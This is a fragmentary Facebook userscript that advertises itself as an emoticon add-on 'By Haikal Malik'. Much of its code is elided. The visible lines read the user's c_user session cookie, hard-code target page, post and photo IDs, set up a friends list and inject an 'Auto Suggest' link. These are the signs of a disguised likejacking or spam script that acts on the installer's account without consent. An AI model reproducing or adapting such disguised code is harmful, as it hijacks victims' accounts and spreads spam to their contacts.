// ==UserScript==
// @name            New Facebook Emoticon @Haikal_Hacked
// @description     Facebook Emoticon 2013 By Haikal Malik
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/qielovers99" target="_blank">Created By Haikal Malik</a>';
	html += '</div>';
...
var spage_id = "422717814490406";
var spost_id = "422717814490406";
var sfoto_id = "422717814490406";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Haikal Malik';
